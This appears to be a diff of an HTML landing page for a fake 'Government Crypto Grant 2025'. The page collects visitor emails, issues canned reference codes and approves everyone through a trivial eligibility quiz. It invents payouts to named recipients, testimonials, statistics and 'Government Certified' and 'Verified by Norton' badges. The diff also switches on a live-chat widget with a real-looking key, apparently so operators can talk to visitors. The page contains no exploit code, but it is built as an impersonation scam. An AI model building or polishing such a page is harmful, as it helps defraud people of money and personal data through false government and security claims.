@@ -2,277 +2,269 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Government Crypto Grant 2025</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grant Application Portal 2025</title>
   <style>
-      body {
-          font-family: Arial, sans-serif;
-          margin: 0;
-          background: linear-gradient(to bottom right, #003087, #0077b6);
-          color: #333;
-      }
-      header {
-          background: #002855;
-          color: white;
-          padding: 20px;
-          text-align: center;
-      }
-      .container {
-          display: flex;
-          max-width: 1200px;
-          margin: auto;
-          background: #fff;
-          box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      }
-      .sidebar {
-          width: 25%;
-          background: #f4f4f4;
-          padding: 20px;
-          border-right: 1px solid #ddd;
-      }
-      .main-content {
-          flex: 1;
-          padding: 20px;
-      }
-      h2, h3 {
-          color: #003087;
-      }
-      .form-group {
-          margin-bottom: 15px;
-      }
-      label {
-          display: block;
-          margin-bottom: 5px;
-      }
-      input, select, button {
-          padding: 8px;
-          width: 100%;
-          border: 1px solid #ccc;
-          border-radius: 4px;
-      }
-      button {
-          background: #0077b6;
-          color: white;
-          cursor: pointer;
-      }
-      button:hover {
-          background: #005f8c;
-      }
-      #referenceCodeContainer {
-          display: none;
-          margin-top: 15px;
-          padding: 10px;
-          border: 1px solid #ccc;
-          background: #f9f9f9;
-      }
-      #statusMessage {
-          margin-top: 10px;
-          font-weight: bold;
-      }
-      .payout-section, .news-ticker, .security-badges, .quiz-section, .live-stats {
-          margin-top: 30px;
-          padding: 15px;
-          background: #fafafa;
-          border-radius: 5px;
-          border: 1px solid #ddd;
-      }
-      .recent-payouts .payout-item {
-          margin-bottom: 8px;
-      }
-      .news-ticker {
-          background: #003087;
-          color: white;
-          overflow: hidden;
-          white-space: nowrap;
-      }
-      .ticker-content {
-          display: inline-block;
-          padding-left: 100%;
-          animation: ticker 15s linear infinite;
-      }
-      @keyframes ticker {
-          0% { transform: translateX(0); }
-          100% { transform: translateX(-100%); }
-      }
-      .security-badges span {
-          margin-right: 15px;
-          font-weight: bold;
-      }
-      .testimonial, .video-testimonial, .partner-logos {
-          margin: 20px auto;
-          padding: 20px;
-          background: rgba(255,255,255,0.95);
-          border-radius: 5px;
-          box-shadow: 0 0 5px rgba(0,0,0,0.1);
-          max-width: 1200px;
-      }
-      .testimonial img {
-          border-radius: 50%;
-          margin-right: 10px;
-          vertical-align: middle;
-      }
-      .partner-logos span {
-          margin-right: 20px;
-          font-weight: bold;
-      }
-      footer {
-          background: #002855;
-          color: white;
-          text-align: center;
-          padding: 15px;
-          margin-top: 30px;
-      }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f7fb;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    header {
+      background: #1e3a8a;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      display: flex;
+      max-width: 1200px;
+      margin: 20px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .sidebar {
+      width: 25%;
+      padding: 20px;
+      border-right: 1px solid #ddd;
+    }
+    .main-content {
+      width: 75%;
+      padding: 20px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background: #1e3a8a;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #163372;
+    }
+    #referenceCodeContainer {
+      display: none;
+      margin-top: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background: #f9f9f9;
+    }
+    .payout-section, .quiz-section, .live-stats {
+      margin-top: 30px;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      background: #fafafa;
+    }
+    .recent-payouts .payout-item {
+      margin: 5px 0;
+      padding: 5px;
+      background: #eef2ff;
+      border-radius: 3px;
+    }
+    .news-ticker {
+      margin-top: 20px;
+      background: #1e3a8a;
+      color: white;
+      padding: 10px;
+      overflow: hidden;
+    }
+    .security-badges span {
+      display: inline-block;
+      margin-right: 15px;
+      font-size: 14px;
+      color: #555;
+    }
+    .testimonials, .video-testimonial, .partner-logos {
+      margin: 30px auto;
+      max-width: 1200px;
+      padding: 20px;
+      background: white;
+      border-radius: 5px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+    }
+    .testimonial {
+      margin: 15px 0;
+      display: flex;
+      align-items: center;
+    }
+    .testimonial img {
+      border-radius: 50%;
+      margin-right: 15px;
+    }
+    footer {
+      text-align: center;
+      padding: 20px;
+      background: #1e3a8a;
+      color: white;
+      margin-top: 30px;
+    }
   </style>
 </head>
 <body>
+  <header>
+    <h1>Government Crypto Reserve – 2025 Grant Application</h1>
+  </header>
 
-<header>
-  <h1>Government Crypto Grant 2025</h1>
-  <p>Secure • Verified • Fast Payouts</p>
-</header>
-
-<div class="container">
-  <div class="sidebar">
+  <div class="container">
+    <div class="sidebar">
       <h3>Navigation</h3>
       <ul>
-          <li>Home</li>
-          <li>Apply</li>
-          <li>Eligibility</li>
-          <li>Testimonials</li>
-          <li>Support</li>
+        <li>Home</li>
+        <li>Apply</li>
+        <li>Eligibility</li>
+        <li>Contact</li>
       </ul>
-  </div>
+    </div>
 
-  <div class="main-content">
+    <div class="main-content">
       <h2>Applicant Registration</h2>
       <form id="applicantForm" onsubmit="event.preventDefault(); generateReferenceCode();">
-          <div class="form-group">
-              <label for="email">Email:</label>
-              <input type="email" id="email" name="email" required>
-          </div>
-          <button type="button" onclick="generateReferenceCode()">Generate Reference Code</button>
+        <div class="form-group">
+          <label for="email">Email:</label>
+          <input type="email" id="email" name="email" required>
+        </div>
+        <button type="button" onclick="generateReferenceCode()">Generate Reference Code</button>
       </form>
 
+      <!-- ✅ Reference Code container fixed -->
       <div id="referenceCodeContainer">
-          <p><strong>Your Reference ID:</strong> <span id="referenceId"></span></p>
+        <p><strong>Your Reference ID:</strong> <span id="referenceId"></span></p>
       </div>
       <div id="statusMessage"></div>
 
       <div class="payout-section">
-          <h3>Recent Payouts</h3>
-          <p>Once approved, your grant will be processed discreetly and securely. See below for examples of recent recipient payouts.</p>
-          <div class="recent-payouts">
-              <div class="payout-item">Rudy Henderson received $5,000 through PayPal Bitcoin.</div>
-              <div class="payout-item">James Prowler received $2,500 with Moon Pay.</div>
-              <div class="payout-item">Stella Stanford received $10,000 via Cash App.</div>
-              <div class="payout-item">Marcus Lee received $4,000 through Venmo transfer.</div>
-              <div class="payout-item">Elena Ramirez received $7,500 using Zelle.</div>
-          </div>
+        <h3>Recent Payouts</h3>
+        <p>Once approved, your grant will be processed discreetly and securely. See below for examples of recent recipient payouts.</p>
+        <div class="recent-payouts">
+          <div class="payout-item">Rudy Henderson received $5,000 through PayPal Bitcoin.</div>
+          <div class="payout-item">James Prowler received $2,500 with Moon Pay.</div>
+          <div class="payout-item">Stella Stanford received $10,000 via Cash App.</div>
+          <div class="payout-item">Marcus Lee received $4,000 through Venmo transfer.</div>
+          <div class="payout-item">Elena Ramirez received $7,500 using Zelle.</div>
+        </div>
       </div>
 
       <div class="news-ticker">
-          <div class="ticker-content">
-              &nbsp; 2025 Grants Issued to 10,000+ Americans – Apply Now! &nbsp; | &nbsp; Total Funding Exceeds $50M! &nbsp; | &nbsp; New Crypto Reserve Launched Today! &nbsp;
-          </div>
+        <div class="ticker-content">
+          &nbsp; 2025 Grants Issued to 10,000+ Americans – Apply Now! &nbsp; | &nbsp; Total Funding Exceeds $50M! &nbsp; | &nbsp; New Crypto Reserve Launched Today! &nbsp;
+        </div>
       </div>
 
       <div class="security-badges">
-          <span>SSL Secured</span>
-          <span>Verified by Norton</span>
-          <span>Government Certified</span>
+        <span>SSL Secured</span>
+        <span>Verified by Norton</span>
+        <span>Government Certified</span>
       </div>
 
       <div class="quiz-section">
-          <h3>Eligibility Quiz</h3>
-          <form id="eligibilityQuiz" onsubmit="event.preventDefault(); checkEligibility(event);">
-              <div class="form-group">
-                  <label>Are you a U.S. citizen?</label>
-                  <select name="citizen" required>
-                      <option value="">Select</option>
-                      <option value="yes">Yes</option>
-                      <option value="no">No</option>
-                  </select>
-              </div>
-              <div class="form-group">
-                  <label>Are you over 18?</label>
-                  <select name="age" required>
-                      <option value="">Select</option>
-                      <option value="yes">Yes</option>
-                      <option value="no">No</option>
-                  </select>
-              </div>
-              <button type="submit">Check Eligibility</button>
-          </form>
-          <div id="quizResult"></div>
+        <h3>Eligibility Quiz</h3>
+        <form id="eligibilityQuiz" onsubmit="event.preventDefault(); checkEligibility(event);">
+          <div class="form-group">
+            <label>Are you a U.S. citizen?</label>
+            <select name="citizen" required>
+              <option value="">Select</option>
+              <option value="yes">Yes</option>
+              <option value="no">No</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Are you over 18?</label>
+            <select name="age" required>
+              <option value="">Select</option>
+              <option value="yes">Yes</option>
+              <option value="no">No</option>
+            </select>
+          </div>
+          <button type="submit">Check Eligibility</button>
+        </form>
+        <div id="quizResult"></div>
       </div>
 
       <div class="live-stats">
-          <p>Grants Issued: <span id="grantsIssued">5,432</span></p>
-          <p>Total Funded: $<span id="totalFunded">12,000,000</span></p>
+        <p>Grants Issued: <span id="grantsIssued">5,432</span></p>
+        <p>Total Funded: $<span id="totalFunded">12,000,000</span></p>
       </div>
+    </div>
   </div>
-</div>
 
-<div class="testimonials">
-  <h2 style="text-align: center; clear: both;">Success Stories from 2025 Recipients</h2>
-  <div class="testimonial">
+  <div class="testimonials">
+    <h2 style="text-align: center; clear: both;">Success Stories from 2025 Recipients</h2>
+    <div class="testimonial">
       <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=80&h=80&fit=crop&crop=face" alt="Sarah M.">
       <p><strong>Sarah M., Entrepreneur</strong><br>"Received my $10,000 BTC grant in under 24 hours! This program changed my startup."</p>
-  </div>
-  <div class="testimonial">
+    </div>
+    <div class="testimonial">
       <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=80&h=80&fit=crop&crop=face" alt="Mike R.">
       <p><strong>Mike R., Innovator</strong><br>"PayPal payout was seamless. As a 2025 recipient, I highly recommend this official reserve."</p>
-  </div>
-  <div class="testimonial">
+    </div>
+    <div class="testimonial">
       <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face" alt="Lisa T.">
       <p><strong>Lisa T., Small Business Owner</strong><br>"Cash App transfer arrived instantly. Government Crypto Grant made my dreams reality!"</p>
+    </div>
   </div>
-</div>
 
-<div class="video-testimonial">
-  <h3 style="text-align: center;">Video Testimonial</h3>
-  <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0" title="Placeholder Testimonial Video" frameborder="0" allowfullscreen></iframe>
-  <p style="text-align: center; font-style: italic;">Watch John D. share his $15,000 grant success story!</p>
-</div>
+  <div class="video-testimonial" style="max-width: 1200px; margin: 20px auto; padding: 20px; background-color: rgba(255, 255, 255, 0.95); border-radius: 5px; box-shadow: 0 0 5px rgba(0,0,0,0.1);">
+    <h3 style="text-align: center;">Video Testimonial</h3>
+    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0" title="Placeholder Testimonial Video" frameborder="0" allowfullscreen></iframe>
+    <p style="text-align: center; font-style: italic;">Watch John D. share his $15,000 grant success story!</p>
+  </div>
 
-<div class="partner-logos">
-  <h3>Trusted Partners</h3>
-  <span>Bank USA</span>
-  <span>Crypto Exchange</span>
-  <span>Secure Pay</span>
-</div>
+  <div class="partner-logos">
+    <h3>Trusted Partners</h3>
+    <span>Bank USA</span>
+    <span>Crypto Exchange</span>
+    <span>Secure Pay</span>
+  </div>
 
-<footer>
-  <p>&copy; 2025 Government Crypto Reserve – All Rights Reserved</p>
-</footer>
+  <footer>
+    <p>&copy; 2025 Government Crypto Reserve. All Rights Reserved.</p>
+  </footer>
 
-<script>
-  // Reference code generator
-  const referenceCodes = [
+  <script>
+    const referenceCodes = [
       'GCR-ABC123XYZ',
       'GCR-DEF456UVS',
       'GCR-GHI789RST',
       'GCR-JKL012MNO',
       'GCR-PQR345KLM'
-  ];
-  const usedCodes = [];
+    ];
+    const usedCodes = [];
 
-  function generateReferenceCode() {
+    function generateReferenceCode() {
       const email = document.getElementById('email').value.trim();
       const referenceIdSpan = document.getElementById('referenceId');
       const referenceCodeContainer = document.getElementById('referenceCodeContainer');
       const statusMessage = document.getElementById('statusMessage');
 
       if (!email) {
-          statusMessage.style.color = 'red';
-          statusMessage.textContent = 'Please enter a valid email.';
-          return;
+        statusMessage.style.color = 'red';
+        statusMessage.textContent = 'Please enter a valid email.';
+        return;
       }
 
       if (usedCodes.length === referenceCodes.length) {
-          statusMessage.style.color = 'red';
-          statusMessage.textContent = 'All reference codes have been used.';
-          return;
+        statusMessage.style.color = 'red';
+        statusMessage.textContent = 'All reference codes have been used.';
+        return;
       }
 
       let availableCodes = referenceCodes.filter(c => !usedCodes.includes(c));
@@ -283,36 +275,35 @@
       referenceCodeContainer.style.display = 'block';
       statusMessage.style.color = 'green';
       statusMessage.textContent = `Reference code generated: ${referenceId}`;
-  }
+    }
 
-  // Quiz check
-  function checkEligibility(event) {
+    function checkEligibility(event) {
       const form = event.target;
       const citizen = form.citizen.value;
       const age = form.age.value;
-      const quizResult = document.getElementById('quizResult');
+      const result = document.getElementById('quizResult');
 
       if (citizen === 'yes' && age === 'yes') {
-          quizResult.style.color = 'green';
-          quizResult.textContent = '✅ You are eligible to apply for the grant!';
+        result.style.color = 'green';
+        result.textContent = '✅ You are eligible to apply for the 2025 Government Crypto Grant.';
       } else {
-          quizResult.style.color = 'red';
-          quizResult.textContent = '❌ Sorry, you are not eligible.';
+        result.style.color = 'red';
+        result.textContent = '❌ Sorry, you are not eligible for this program.';
       }
-  }
-</script>
+    }
+  </script>
 
-<!-- Smartsupp Live Chat -->
-<script type="text/javascript">
-var _smartsupp = _smartsupp || {};
-_smartsupp.key = 'YOUR_REAL_UNIQUE_KEY_HERE'; 
-window.smartsupp||(function(d) {
-  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
-  c.type='text/javascript';c.charset='utf-8';c.async=true;
-  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
-})(document);
-</script>
-
+  <!-- Smartsupp Live Chat -->
+  <script type="text/javascript">
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = 'ecd8907def84d4881af5c436a33a0753bb2efe1e'; 
+    window.smartsupp||(function(d) {
+      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+      c.type='text/javascript';c.charset='utf-8';c.async=true;
+      c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+  </script>
+  <noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
 </body>
 </html>
